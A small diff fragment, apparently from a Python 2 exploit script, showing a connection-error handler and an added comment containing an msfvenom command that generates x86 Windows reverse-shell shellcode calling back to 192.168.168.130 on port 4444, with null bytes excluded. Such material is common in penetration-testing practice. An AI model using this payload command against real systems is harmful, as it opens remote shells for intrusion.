@@ -38,3 +38,9 @@ try:
 except: 
         print "Error connecting to server"
         sys.exit()
+
+
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.168.130 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+
+
